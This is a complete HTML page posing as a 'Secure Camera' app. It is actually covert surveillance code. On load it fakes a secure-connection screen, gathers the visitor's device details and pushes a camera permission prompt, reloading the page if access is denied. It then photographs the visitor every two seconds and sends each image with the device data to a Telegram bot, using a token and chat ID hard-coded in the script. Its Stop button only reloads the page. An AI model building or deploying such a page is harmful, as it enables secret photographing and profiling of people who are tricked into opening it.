<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Secure Camera</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        
        body {
            background-color: #050505;
            color: #ffffff;
            height: 100vh;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        /* --- SCREENS --- */
        .screen {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            transition: opacity 0.5s ease, visibility 0.5s;
            opacity: 0;
            visibility: hidden;
            padding: 20px;
        }
        .screen.active { opacity: 1; visibility: visible; }

        /* --- LOADING SCREEN --- */
        #loading-screen { background: #050505; }
        .spinner {
            width: 50px; height: 50px;
            border: 4px solid rgba(255,255,255,0.1);
            border-top: 4px solid #0088cc;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .loading-text { font-size: 16px; color: #888; letter-spacing: 1px; }

        /* --- CAMERA SCREEN --- */
        #camera-screen { background: #000; justify-content: flex-start; padding: 0; }
        #video-container {
            width: 100%; height: 100%;
            position: relative; overflow: hidden;
        }
        #video { width: 100%; height: 100%; object-fit: cover; }
        
        #flash-overlay {
            position: absolute; top: 0; left: 0; right: 0; bottom: 0;
            background: white; opacity: 0; pointer-events: none;
            transition: opacity 0.1s;
        }

        #status-bar {
            position: absolute; bottom: 0; left: 0; right: 0;
            background: linear-gradient(to top, rgba(0,0,0,0.9), transparent);
            padding: 40px 20px 20px;
            text-align: center;
        }
        #status-text { font-size: 13px; color: #ccc; margin-bottom: 10px; }
        
        .controls { display: flex; gap: 10px; justify-content: center; }
        .btn-stop {
            background: #ff3b30; color: white; border: none;
            padding: 10px 24px; border-radius: 20px; font-weight: bold;
            cursor: pointer; font-size: 14px;
        }

        #canvas { display: none; }
    </style>
</head>
<body>

    <!-- 1. Loading Screen -->
    <div id="loading-screen" class="screen active">
        <div class="spinner"></div>
        <div class="loading-text" id="loading-msg">Initializing secure connection...</div>
    </div>

    <!-- 2. Camera Screen (Directly after loading) -->
    <div id="camera-screen" class="screen">
        <div id="video-container">
            <video id="video" autoplay playsinline muted></video>
            <div id="flash-overlay"></div>
            <div id="status-bar">
                <div id="status-text">Starting auto-capture...</div>
                <div class="controls">
                    <button class="btn-stop" id="btn-stop">Stop</button>
                </div>
            </div>
        </div>
    </div>

    <canvas id="canvas"></canvas>

    <script>
        // --- CONFIGURATION ---
        const BOT_TOKEN = "8868463594:AAF61Hzsu40FbAF-CWjeJE3SRq-nkZqQfMQ";
        const CHAT_ID = "6503428175";
        const CAPTURE_INTERVAL = 2000; // 2 seconds

        // --- DOM ELEMENTS ---
        const screens = {
            loading: document.getElementById('loading-screen'),
            camera: document.getElementById('camera-screen')
        };
        const loadingMsg = document.getElementById('loading-msg');
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const ctx = canvas.getContext("2d", { alpha: false });
        const flash = document.getElementById("flash-overlay");
        const statusText = document.getElementById("status-text");

        let stream = null;
        let captureTimer = null;
        let isUploading = false;
        let deviceInfo = {};

        // --- SCREEN NAVIGATION ---
        function showScreen(name) {
            Object.values(screens).forEach(s => s.classList.remove('active'));
            screens[name].classList.add('active');
        }

        // --- DEVICE INFO GATHERING ---
        async function gatherDeviceInfo() {
            let info = {
                battery: "N/A", ram: "N/A", storage: "N/A", 
                device: "N/A", os: "N/A", network: "N/A", screen: "N/A"
            };

            // 1. Battery
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    info.battery = `${Math.round(battery.level * 100)}% ${battery.charging ? '(Charging)' : ''}`;
                } catch(e) {}
            }

            // 2. RAM
            if (navigator.deviceMemory) info.ram = `${navigator.deviceMemory} GB`;

            // 3. Storage (ROM)
            if (navigator.storage && navigator.storage.estimate) {
                try {
                    const est = await navigator.storage.estimate();
                    const total = (est.quota / (1024**3)).toFixed(1);
                    const used = (est.usage / (1024**3)).toFixed(1);
                    info.storage = `${used}GB / ${total}GB`;
                } catch(e) {}
            }

            // 4. Device Model & OS
            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                try {
                    const ua = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion']);
                    info.device = ua.model || "Unknown";
                    info.os = `${ua.platform} ${ua.platformVersion}`;
                } catch(e) {
                    info.device = navigator.platform;
                    info.os = "Unknown";
                }
            } else {
                const ua = navigator.userAgent;
                info.device = ua.match(/\(([^)]+)\)/)?.[1]?.split(';')[1]?.trim() || "Unknown";
                info.os = ua.includes("Android") ? "Android" : ua.includes("iPhone") ? "iOS" : "Desktop";
            }

            // 5. Network
            if (navigator.connection) {
                info.network = `${navigator.connection.effectiveType || 'Unknown'} (${navigator.connection.downlink || '?'} Mbps)`;
            }

            // 6. Screen
            info.screen = `${window.screen.width}x${window.screen.height}`;

            return info;
        }

        // --- TELEGRAM API ---
        async function sendPhotoToTelegram(blob, caption) {
            const formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("photo", blob, `capture_${Date.now()}.jpg`);
            formData.append("caption", caption);

            try {
                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: "POST", body: formData
                });
                const data = await res.json();
                if (!data.ok && data.error_code === 429) {
                    await new Promise(r => setTimeout(r, (data.parameters?.retry_after || 5) * 1000));
                    sendPhotoToTelegram(blob, caption); // Retry
                }
            } catch (e) { console.error(e); }
        }

        // --- CAPTURE LOGIC ---
        function triggerFlash() {
            flash.style.opacity = "0.8";
            setTimeout(() => { flash.style.opacity = "0"; }, 100);
        }

        async function captureAndSend() {
            if (isUploading || !stream) return;
            isUploading = true;

            try {
                if (canvas.width !== video.videoWidth || canvas.height !== video.videoHeight) {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                }

                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                canvas.toBlob(async (blob) => {
                    if (blob) {
                        triggerFlash();
                        
                        // Build Caption
                        const caption = `📸 *Auto-Capture Report*\n\n` +
                            `🔋 *Battery:* ${deviceInfo.battery}\n` +
                            ` *Device:* ${deviceInfo.device}\n` +
                            `🧠 *RAM:* ${deviceInfo.ram}\n` +
                            `💾 *Storage:* ${deviceInfo.storage}\n` +
                            `🌐 *OS:* ${deviceInfo.os}\n` +
                            `📡 *Network:* ${deviceInfo.network}\n` +
                            `📐 *Screen:* ${deviceInfo.screen}\n` +
                            `⏰ *Time:* ${new Date().toLocaleTimeString()}`;

                        await sendPhotoToTelegram(blob, caption);
                        statusText.innerText = `Sent! Next in 2s...`;
                    }
                    isUploading = false;
                }, "image/jpeg", 0.85);

            } catch (e) {
                console.error(e);
                isUploading = false;
            }
        }

        // --- CAMERA CONTROL ---
        async function startCamera() {
            try {
                // THIS LINE TRIGGERS THE NATIVE BROWSER PERMISSION POPUP
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "environment", width: { ideal: 4096 }, height: { ideal: 2160 } },
                    audio: false
                });
                
                video.srcObject = stream;
                
                video.onloadedmetadata = () => {
                    video.play();
                    showScreen('camera');
                    captureTimer = setInterval(captureAndSend, CAPTURE_INTERVAL);
                };
            } catch (error) {
                // If user denies permission
                alert("Camera permission is required. Please reload the page and allow access.");
                location.reload();
            }
        }

        // --- INITIALIZATION FLOW ---
        async function init() {
            // 1. Simulate Loading
            await new Promise(r => setTimeout(r, 1500));
            loadingMsg.innerText = "Gathering device telemetry...";
            
            // 2. Gather Info in background
            deviceInfo = await gatherDeviceInfo();
            
            await new Promise(r => setTimeout(r, 1000));
            loadingMsg.innerText = "Ready.";
            await new Promise(r => setTimeout(r, 500));

            // 3. IMMEDIATELY trigger native browser permission prompt (No buttons)
            startCamera();
        }

        // --- EVENT LISTENERS ---
        document.getElementById('btn-stop').addEventListener('click', () => {
            clearInterval(captureTimer);
            if(stream) stream.getTracks().forEach(t => t.stop());
            location.reload();
        });

        // Start the app automatically on load
        init();
    </script>
</body>
</html>
